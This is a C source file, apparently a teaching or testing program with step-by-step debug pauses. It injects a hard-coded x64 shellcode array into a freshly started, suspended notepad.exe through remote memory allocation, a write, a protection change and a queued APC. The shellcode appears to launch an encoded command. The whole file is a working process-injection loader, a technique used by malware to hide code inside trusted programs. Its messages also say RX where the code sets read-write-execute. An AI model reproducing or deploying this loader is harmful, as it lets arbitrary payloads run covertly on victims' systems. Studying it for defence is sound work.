#include <Windows.h>
#include <stdio.h>

// payload
unsigned char Payload[] = {
    0x48, 0x31, 0xff, 0x48, 0xf7, 0xe7, 0x65, 0x48, 0x8b, 0x58, 0x60, 0x48, 0x8b, 0x5b, 0x18,
    0x48, 0x8b, 0x5b, 0x20, 0x48, 0x8b, 0x1b, 0x48, 0x8b, 0x1b, 0x48, 0x8b, 0x5b, 0x20, 0x49,
    0x89, 0xd8, 0x8b, 0x5b, 0x3c, 0x4c, 0x01, 0xc3, 0x48, 0x31, 0xc9, 0x66, 0x81, 0xc1, 0xff,
    0x88, 0x48, 0xc1, 0xe9, 0x08, 0x8b, 0x14, 0x0b, 0x4c, 0x01, 0xc2, 0x4d, 0x31, 0xd2, 0x44,
    0x8b, 0x52, 0x1c, 0x4d, 0x01, 0xc2, 0x4d, 0x31, 0xdb, 0x44, 0x8b, 0x5a, 0x20, 0x4d, 0x01,
    0xc3, 0x4d, 0x31, 0xe4, 0x44, 0x8b, 0x62, 0x24, 0x4d, 0x01, 0xc4, 0xeb, 0x32, 0x5b, 0x59,
    0x48, 0x31, 0xc0, 0x48, 0x89, 0xe2, 0x51, 0x48, 0x8b, 0x0c, 0x24, 0x48, 0x31, 0xff, 0x41,
    0x8b, 0x3c, 0x83, 0x4c, 0x01, 0xc7, 0x48, 0x89, 0xd6, 0xf3, 0xa6, 0x74, 0x05, 0x48, 0xff,
    0xc0, 0xeb, 0xe6, 0x59, 0x66, 0x41, 0x8b, 0x04, 0x44, 0x41, 0x8b, 0x04, 0x82, 0x4c, 0x01,
    0xc0, 0x53, 0xc3, 0x48, 0x31, 0xc9, 0x80, 0xc1, 0x07, 0x48, 0xb8, 0x0f, 0xa8, 0x96, 0x91,
    0xba, 0x87, 0x9a, 0x9c, 0x48, 0xf7, 0xd0, 0x48, 0xc1, 0xe8, 0x08, 0x50, 0x51, 0xe8, 0xb0,
    0xff, 0xff, 0xff, 0x49, 0x89, 0xc6, 0x48, 0x31, 0xc9, 0x48, 0xf7, 0xe1, 0x50, 0x48, 0xb8,
    0x9c, 0x9e, 0x93, 0x9c, 0xd1, 0x9a, 0x87, 0x9a, 0x48, 0xf7, 0xd0, 0x50, 0x48, 0x89, 0xe1,
    0x48, 0xff, 0xc2, 0x48, 0x83, 0xec, 0x20, 0x41, 0xff, 0xd6
};

void waitForEnter(const char* stepName) {
    printf("\n[DEBUG] Step: %s\n", stepName);
    printf("[DEBUG] Press Enter to continue...");
    getchar();
}

int main() {
    // CreateProcess Variables
    STARTUPINFO si;
    PROCESS_INFORMATION pi;

    ZeroMemory(&si, sizeof(si));
    si.cb = sizeof(si);
    ZeroMemory(&pi, sizeof(pi));

    // It could be any application here
    LPCWSTR execFile = L"C:\\Windows\\notepad.exe";

    waitForEnter("1. About to create process in DEBUG mode");

    // CreateProcess in DEBUG State
    BOOL bCreateProcess = CreateProcess(execFile, NULL, NULL, NULL, FALSE,
        DEBUG_PROCESS | CREATE_SUSPENDED, NULL, NULL, &si, &pi);

    if (bCreateProcess == FALSE) {
        printf("\nError Creating the Process: %d", GetLastError());
        return -1;
    }

    printf("Successfully created the process in Debug state\n");
    printf("  Process ID: %lu\n", pi.dwProcessId);
    printf("  Thread ID: %lu\n", pi.dwThreadId);
    printf("  Process Handle: 0x%p\n", pi.hProcess);
    printf("  Thread Handle: 0x%p\n", pi.hThread);

    waitForEnter("2. Process created. About to allocate memory in target process");

    DWORD dwOldProtection = NULL;
    HANDLE hProcess = pi.hProcess;
    HANDLE hThread = pi.hThread;
    SIZE_T dwSize = sizeof(Payload);
    SIZE_T sNumberOfBytesWritten = NULL;

    // Get current memory info before allocation
    MEMORY_BASIC_INFORMATION mbi_before;
    VirtualQueryEx(hProcess, NULL, &mbi_before, sizeof(mbi_before));

    PVOID lpAlloc = VirtualAllocEx(hProcess, NULL, dwSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

    if (lpAlloc == NULL) {
        printf("\nError Allocating the memory: %d", GetLastError());
        CloseHandle(hProcess);
        CloseHandle(hThread);
        return -1;
    }
    printf("Successfully allocated memory at: 0x%p \n", lpAlloc);
    printf("  Allocation size: %zu bytes\n", dwSize);

    // Get memory info after allocation
    MEMORY_BASIC_INFORMATION mbi_after;
    VirtualQueryEx(hProcess, lpAlloc, &mbi_after, sizeof(mbi_after));
    printf("  Memory region base: 0x%p\n", mbi_after.BaseAddress);
    printf("  Memory region size: %zu bytes\n", mbi_after.RegionSize);
    printf("  Memory protection: 0x%lx (PAGE_READWRITE)\n", mbi_after.Protect);

    waitForEnter("3. Memory allocated. About to write shellcode to target process");

    printf("Shellcode size: %zu bytes\n", dwSize);
    printf("Shellcode bytes (first 16): ");
    for (int i = 0; i < 16 && i < dwSize; i++) {
        printf("%02x ", Payload[i]);
    }
    printf("\n");

    BOOL bWriteBuffer = WriteProcessMemory(hProcess, lpAlloc, Payload, dwSize, &sNumberOfBytesWritten);

    if (bWriteBuffer == FALSE) {
        printf("Failed to Write Memory to the process: %d\n", GetLastError());
        CloseHandle(hProcess);
        CloseHandle(hThread);
        return -1;
    }

    printf("Successfully written %zu Bytes\n", sNumberOfBytesWritten);

    // Verify the write by reading it back
    unsigned char verifyBuffer[256] = { 0 };
    SIZE_T bytesRead = 0;
    if (ReadProcessMemory(hProcess, lpAlloc, verifyBuffer, min(16, dwSize), &bytesRead)) {
        printf("Verification read (first 16 bytes): ");
        for (int i = 0; i < bytesRead; i++) {
            printf("%02x ", verifyBuffer[i]);
        }
        printf("\n");
    }

    waitForEnter("4. Shellcode written. About to change memory protection to RX");

    if (!VirtualProtectEx(hProcess, lpAlloc, dwSize, PAGE_EXECUTE_READWRITE, &dwOldProtection)) {
        printf("Failed to change memory protection from RW to RX: %d \n", GetLastError());
        CloseHandle(hProcess);
        CloseHandle(hThread);
        return -1;
    }

    printf("Memory protection changed successfully\n");
    printf("  Old protection: 0x%lx\n", dwOldProtection);
    printf("  New protection: 0x%lx (PAGE_EXECUTE_READWRITE)\n", PAGE_EXECUTE_READWRITE);

    // Verify protection change
    MEMORY_BASIC_INFORMATION mbi_protect;
    VirtualQueryEx(hProcess, lpAlloc, &mbi_protect, sizeof(mbi_protect));
    printf("  Current protection: 0x%lx\n", mbi_protect.Protect);

    waitForEnter("5. Memory protection changed. About to queue APC");

    printf("Queueing APC with:\n");
    printf("  APC Routine address: 0x%p\n", lpAlloc);
    printf("  Thread Handle: 0x%p\n", hThread);
    printf("  Thread ID: %lu\n", pi.dwThreadId);

    // Note: QueueUserAPC expects PAPCFUNC type
    DWORD dQueueAPC = QueueUserAPC((PAPCFUNC)lpAlloc, hThread, NULL);
    if (dQueueAPC == 0) {
        printf("\nError Queueing APC: %d", GetLastError());
        CloseHandle(hProcess);
        CloseHandle(hThread);
        return -1;
    }

    printf("APC queued successfully!\n");
    printf("  Return value: %lu\n", dQueueAPC);

    waitForEnter("6. APC queued. About to stop debugging and resume thread");

    printf("Stopping debugger from process %lu...\n", pi.dwProcessId);

    // First, resume the thread to allow APC execution
    ResumeThread(hThread);
    printf("Thread resumed\n");

    // Then stop debugging
    if (!DebugActiveProcessStop(pi.dwProcessId)) {
        printf("Warning: DebugActiveProcessStop failed: %d\n", GetLastError());
        printf("This might be expected if the process has already terminated\n");
    }
    else {
        printf("Debugging stopped successfully\n");
    }

    waitForEnter("7. About to close handles and exit");

    // Close the handle once the program is exited
    printf("Closing handles...\n");
    CloseHandle(hProcess);
    CloseHandle(hThread);

    printf("Process handles closed\n");
    printf("Press Enter to exit the injector...");
    getchar();

    return 0;
}
